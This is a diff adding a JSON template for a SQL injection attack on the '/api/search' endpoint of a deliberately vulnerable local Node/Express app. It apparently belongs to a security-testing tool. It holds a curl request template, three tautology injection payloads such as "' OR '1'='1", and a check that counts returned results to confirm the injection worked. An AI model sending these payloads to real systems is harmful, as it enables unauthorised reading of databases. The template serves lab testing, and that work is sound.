@@ -1,0 +1,56 @@
+{
+  "templateId": "sqli-search-tautology",
+  "attackType": {
+    "name": "sql_injection",
+    "cwe": "CWE-89"
+  },
+  "dependency": {
+    "runtime": "node",
+    "framework": "express",
+    "library": "node:sqlite"
+  },
+  "target": {
+    "method": "GET",
+    "endpoint": "/api/search",
+    "application": "vul-web2-daehan"
+  },
+  "request": {
+    "curl": "curl -s '{{origin}}/api/search?q={{payload}}'"
+  },
+  "blanks": {
+    "origin": {
+      "required": true,
+      "type": "url",
+      "desc": "타겟 origin",
+      "example": "http://127.0.0.1:4101"
+    },
+    "payload": {
+      "required": true,
+      "type": "string",
+      "desc": "주입 문자열",
+      "pickFrom": "payloads",
+      "example": "' OR '1'='1"
+    }
+  },
+  "payloads": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "%' OR '1'='1"
+  ],
+  "verify": {
+    "mode": "resultCount",
+    "field": "results",
+    "baseline": {
+      "value": "zzqnomatchzz",
+      "expect": 0
+    },
+    "attack": {
+      "expectMin": 1
+    }
+  },
+  "executor": "intruder",
+  "mutating": false,
+  "origin": "human_authored",
+  "source": "team / PayloadsAllTheThings",
+  "trust": "confirmed"
+}
